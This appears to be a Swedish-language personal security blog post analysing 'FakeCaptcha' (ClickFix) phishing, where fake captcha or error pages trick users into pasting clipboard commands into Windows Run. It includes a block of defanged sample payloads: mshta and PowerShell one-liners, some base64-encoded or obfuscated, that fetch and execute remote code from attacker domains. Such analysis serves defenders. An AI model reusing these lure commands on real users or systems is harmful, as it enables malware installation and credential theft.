## Mindmap over hemsidan

<p align="center">
  <img src="assets/img/mindmap-redsnw-github-io.jpg" alt="Mindmap over redsnw.github.io" width="900">
</p>
# FakeCaptcha Phishing Analys
Denna bloggen kommer innehÃ¥lla kortfattad information som jag har hittat nÃ¤r det gÃ¤ller FakeCaptcha Phishing.

Dubbell info

# Fakecaptcha 

FakeCaptcha Ã¤r en phishing metod som anvÃ¤nder captcha pÃ¥ fÃ¶r att lura anvÃ¤ndarna att sjÃ¤lv skriva in illvillig powershell kod i sin dator.
Hemsidan kommer visa en fake captcha och fÃ¶r att komma vidare till den "riktiga hemsidan" mÃ¥ste man bevisa att man Ã¤r inte en robot genom att fÃ¶lja instruktionerna.

Instruktionerna
1. WIN + R            -- Ã–ppnar Run boxen i Windows
2. CTRL + V           -- Klistrar in en illvillig powershell kod i run boxen
3. Enter              -- FÃ¶r att kÃ¶ra koden i run


Om du undrar hur koden blev kopierad i fÃ¶rsta hand Ã¤r de fÃ¶r att anvÃ¤ndaren tryckte "Im not a robot" eller "Verify" fÃ¶rst, innan instruktionerna dÃ¶k upp.
Den Kopieras i smyg utan anvÃ¤ndarens kunskap.

Som bilden visar nedanfÃ¶r fÃ¶rsÃ¶ker hackarna ge anvÃ¤ndarna en falsk trygghet genom att visa bara en del av powershell koden som ser ut och vara Ã¤kta.



![Fakecaptchaps1](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg)



NedanfÃ¶r finns det exempel pÃ¥ hur powershell koden kan se ut.



```
mshta.exe hxxps://ernier[.]shop/lyricalsync[.]mp3 # ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 885203

mshta.exe hxxps://zb-files[.]oss-ap-southeast-1[.]aliyuncs[.]com/DPST_doc.mp3 #  ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 815403

mshta.exe hxxp://ok[.]fish-cloud-jar[.]us/ # "Authentication needed: Secure Code 3V8MUR-9PW4S"

mshta.exe hxxps://yedik[.]shop/Tech_House_Future[.]mp3 #  ''Î™ am nÎ¿t a rÎ¿bÎ¿t: Ð¡ÐÐ Ð¢Ð¡ÐÐ Verification UID: 885203

mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''

mshta.exe hxxps://welcome12-world[.]com/wpDoQRpZt2PIffud[.]html #'' I'm human ID233560''

mshta.exe hxxps://w19-seasalt[.]com/mbDjBsRmxM1LreEp[.]html #'' I'm human ID984662''

PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $contentâ€

cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" && âœ… I am not a robot - reCAPTCHA ID: 7845

mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM âœ… Human, not a robot: Verification Ð¡ÐÐ TCHA ID:658630

PoWeRsHeLl -w h -c cUr"L.E"x"E" -k -L
hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"el"l" -

```


Ett av hackarnas mÃ¥l Ã¤r att fÃ¶rsÃ¶ka fÃ¥ anvÃ¤ndarna tro att hemsidan och att instruktionerna Ã¤r Ã¤kta och det gÃ¶r dom genom att Ã¤ndra domÃ¤n namnet till nÃ¥t som ser Ã¤kta ut oftast anvÃ¤nder dom populÃ¤ra hemsidor som facebook eller microsoft. 

SÃ¥ som bilden visar nedanfÃ¶r gÃ¶r dom backgrunden till den riktiga hemsidan fast suddig.

![FakeCaptcha](https://www.york.ac.uk/media/it-services/images/about/news/2025/Fake%20captcha,%20full%20browser.png)

# FakeError

Fake error Ã¤r princip samma sak som FakeCaptcha en skillnaden Ã¤r att den spelar pÃ¥ anvÃ¤ndarens rÃ¤dsla att nÃ¥nting har gÃ¥tt fel.
FÃ¶r att Ã¶vertyga anvÃ¤ndaren mer sÃ¥ lÃ¥ser hemsidan sig sjÃ¤lv i fullskÃ¤rm.
Exempel pÃ¥ FakeError nedanfÃ¶r.



![FakeErrorBild](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg)



# Initial Access
En Lista fÃ¶r hackarnas olika sÃ¤tt att sprida FakeCaptcha / FakeError hemsidorna
- Ã„kta sidor som ersÃ¤tts av FakeCaptcha / FakeError
- Malvertising / SEO-poisoning
- Redirictions
- Fake tech support / tutorials
- E-mail



# Tricks hackarna har anvÃ¤nt sig av
Dom anvÃ¤nder Ã¤ven andra metoder fÃ¶r att fÃ¶rhindra att bli pÃ¥kommna av sÃ¤kerhets fÃ¶retagen gemom att anvÃ¤nda Cloudflare captcha pÃ¥ deras egna illvilliga hemsida, fÃ¶r att sen fÃ¶rhindra web crawlers av sÃ¤kerhets fÃ¶retagen att hitta deras skadlig kod.




# Konsekvenserna
Virusen som blir installerad Ã¤r oftast Stealers eller RAT som sen leder till konto kappning, bedrÃ¤geri eller crypto mining



# Labb ide
GÃ¶ra en enkel version av detta med hjÃ¤lp av attack och defend vm's 
Ã–ppna calculator pÃ¥ defend vm frÃ¥n attack vm. 



# Referenser
````
https://any.run/cybersecurity-blog/new-phishing-tactics/

https://app.any.run/tasks/22b677ed-8ee9-4c25-81c0-fd9073540009/?
utm_source=anyrunblog&utm_medium=article_bottom&utm_campaign=newphishing11102023&utm_content=task

https://intelligence.any.run/analysis/lookup#{%22query%22:%22threatName:%5C%22qrcode%5C%22%22,%22dateRange%22:180}

https://pcriot.com.au/fake-cloudflare-win-r-malware-what-it-is-how-it-works-and-how-to-clean-your-site/

https://community.spiceworks.com/t/getting-out-of-scareware-when-its-full-screen-and-doesnt-respond-to-control-al/966997 -- hackarna
anvÃ¤nder tvingat fullscreen fÃ¶r sin hemsida?

https://www.malwarebytes.com/blog/news/2025/03/fake-captcha-websites-hijack-your-clipboard-to-install-information-stealers

https://thehackernews.com/2025/08/clickfix-malware-campaign-exploits.html -- bra analys

https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vecto
````

